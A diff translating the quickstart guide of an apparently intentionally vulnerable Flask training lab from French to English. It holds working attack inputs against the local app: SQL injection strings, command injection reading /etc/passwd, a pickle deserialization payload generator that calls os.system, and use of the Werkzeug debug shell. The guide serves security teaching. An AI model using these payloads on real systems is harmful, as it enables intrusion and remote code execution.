@@ -1,106 +1,106 @@
-# 🚀 Guide d'Installation & Démarrage Rapide
+# 🚀 Installation Guide & Quick Start
 
-## 📋 Prérequis
+## 📋 Prerequisites
 
 - **Python 3.8+**
-- **pip** ou **poetry**
+- **pip** or **poetry**
 - **Git**
-- (Optionnel) **Docker & Docker Compose**
+- (Optional) **Docker & Docker Compose**
 
 ---
 
 ## 📥 Installation
 
-### Option 1 : Installation Locale
+### Option 1 : Local Installation
 
 ```bash
-# Cloner le repository
+# Clone the repository
 git clone https://github.com/username/security-vulnerabilities.git
 cd security-vulnerabilities
 
-# Créer un environnement virtuel
+# Create a virtual environment
 python3 -m venv venv
-source venv/bin/activate  # Sur Windows: venv\Scripts\activate
+source venv/bin/activate  # On Windows: venv\Scripts\activate
 
-# Installer les dépendances
-pip install -r requirements.txt
+# Install dependencies
+pip install -r python/requirements.txt
 ```
 
-### Option 2 : Avec Docker
+### Option 2 : With Docker
 
 ```bash
-# Construire l'image
+# Build the image
 docker build -t security-vuln .
 
-# Lancer le container
+# Run the container
 docker run -p 5000:5000 security-vuln
 
-# Ou avec Docker Compose
+# Or with Docker Compose
 docker-compose up
 ```
 
 ---
 
-## 🎯 Utilisation
+## 🎯 Usage
 
-### Démarrer l'Application
+### Start the Application
 
 ```bash
-# Activation de l'environnement virtuel (si pas fait)
+# Activate the virtual environment (if not done)
 source venv/bin/activate
 
-# Lancer l'app
-python main.py
+# Run the app
+python python/main.py
 ```
 
-L'application démarre sur `http://localhost:5000`
+The application starts on `http://localhost:5000`
 
 ---
 
-## 🧪 Tester les Vulnérabilités
+## 🧪 Testing Vulnerabilities
 
 ### 1️⃣ SQL Injection
 
 ```bash
-# Requête normale
+# Normal request
 curl "http://localhost:5000/vulnerable-action?data=1"
 
 # SQL Injection - Bypass
 curl "http://localhost:5000/vulnerable-action?data=' OR '1'='1"
 
-# SQL Injection - Extraction de données
+# SQL Injection - Data extraction
 curl "http://localhost:5000/vulnerable-action?data=' UNION SELECT * FROM admin--"
 ```
 
 ---
 
-### 2️⃣ Injection de Commande
+### 2️⃣ Command Injection
 
 ```bash
-# Requête normale
+# Normal request
 curl "http://localhost:5000/vulnerable-action?data=hello"
 
-# Command Injection - Lire un fichier
+# Command Injection - Read a file
 curl "http://localhost:5000/vulnerable-action?data=;cat%20/etc/passwd"
 
-# Command Injection - Exécuter whoami
+# Command Injection - Execute whoami
 curl "http://localhost:5000/vulnerable-action?data=;whoami"
 ```
 
-⚠️ Sur Windows, utiliser `|` au lieu de `;`
+⚠️ On Windows, use `|` instead of `;`
 
 ---
 
-### 3️⃣ Désérialisation Insecure (Pickle)
+### 3️⃣ Insecure Deserialization (Pickle)
 
-Générer un payload d'exploitation :
+Generate an exploitation payload :
 
 ```python
 import pickle
 import base64
 import os
 
-# Créer une charge utile malveillante
+# Create a malicious payload
 class RCE:
     def __reduce__(self):
         return (os.system, ('touch /tmp/pwned',))
@@ -110,41 +110,41 @@ encoded = base64.b64encode(payload).decode()
 print(f"?data={encoded}")
 ```
 
-Envoyer le payload :
+Send the payload :
 ```bash
-curl "http://localhost:5000/vulnerable-action?data={PAYLOAD_ENCODÉ}"
+curl "http://localhost:5000/vulnerable-action?data={ENCODED_PAYLOAD}"
 ```
 
 ---
 
-### 4️⃣ Clés Secrètes Hardcodées
+### 4️⃣ Hardcoded Secret Keys
 
-Vérifier le code source ou utiliser des outils :
+Check the source code or use tools :
 
 ```bash
-# Avec grep
+# With grep
 grep -r "SECRET_KEY\|PASSWORD" .
 
-# Avec gitleaks
+# With gitleaks
 gitleaks detect --source . -v
 ```
 
 ---
 
-### 5️⃣ Mode Debug
+### 5️⃣ Debug Mode
 
-Accéder au débogueur Werkzeug :
+Access the Werkzeug debugger :
 
 ```
 http://localhost:5000/vulnerable-action?data=invalid
-# Cliquer sur le bouton console pour accéder au shell interactif
+# Click the console button to access the interactive shell
 ```
 
 ---
 
-## 🔍 Analyser avec des Outils de Sécurité
+## 🔍 Analyze with Security Tools
 
-### Bandit (Scan Python)
+### Bandit (Python Scan)
 ```bash
 pip install bandit
 bandit -r . -ll
@@ -158,61 +158,63 @@ semgrep --config=p/security-audit .
 
 ### OWASP ZAP (Dynamic Scan)
 ```bash
-# Installer : https://www.zaproxy.org/
+# Install: https://www.zaproxy.org/
 zaproxy.sh -cmd -quickurl http://localhost:5000 -quickout report.html
 ```
 
 ---
 
-## 📚 Structure du Projet
+## 📚 Project Structure
 
 ```
 security-vulnerabilities/
-├── main.py                      # Code vulnérable principal
-├── README.md                    # Ce fichier
-├── SECURITY_FIXES.md            # Solutions détaillées
-├── CODE_OF_CONDUCT.md           # Politique d'utilisation
-├── requirements.txt             # Dépendances Python
-├── Dockerfile                   # Configuration Docker
-├── docker-compose.yml           # Orchestration Docker
-├── .gitignore                   # Fichiers à ignorer
-├── .env.example                 # Exemple de variables d'env
-├── tests/                       # Tests d'exploitation (futur)
-└── docs/                        # Documentation additionnelle (futur)
+├── README.md                    # Overview
+├── QUICKSTART.md                # Installation & quick start
+├── SECURITY_FIXES.md            # Detailed solutions
+├── CODE_OF_CONDUCT.md           # Usage policy
+├── Dockerfile                   # Docker configuration
+├── docker-compose.yml           # Docker orchestration
+├── .gitignore                   # Files to ignore
+├── .env.example                 # Environment variables template
+├── python/
+│   ├── main.py                  # Vulnerable code
+│   └── requirements.txt         # Python dependencies
+├── tests/                       # Exploitation tests (future)
+└── docs/                        # Additional documentation (future)
 ```
 
 ---
 
 ## ❌ Troubleshooting
 
-### Port 5000 déjà utilisé
+### Port 5000 already in use
 ```bash
-# Chercher le processus
+# Find the process
 lsof -i :5000
 
-# Ou utiliser un autre port
-python main.py --port 5001
+# Or use a different port
+python python/main.py --port 5001
 ```
 
-### Erreur : Module Flask non trouvé
+### Error: Flask module not found
 ```bash
-# Vérifier que l'environnement virtuel est activé
+# Check that the virtual environment is activated
 which python
 
-# Réinstaller les dépendances
-pip install --upgrade -r requirements.txt
+# Reinstall dependencies
+pip install --upgrade -r python/requirements.txt
 ```
 
-### Erreur : Permission denied
+### Error: Permission denied
 ```bash
-# Sur macOS/Linux
-chmod +x main.py
-python main.py
+# On macOS/Linux
+chmod +x python/main.py
+python python/main.py
 ```
 
 ---
 
-## 🎓 Ressources d'Apprentissage
+## 🎓 Learning Resources
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
@@ -221,6 +223,6 @@ python main.py
 
 ---
 
-**Questions ? Consultez [SECURITY_FIXES.md](SECURITY_FIXES.md) pour les solutions détaillées.**
+**Questions? See [SECURITY_FIXES.md](SECURITY_FIXES.md) for detailed solutions.**
 
-Dernière mise à jour : January 2026
+Last updated : January 2026
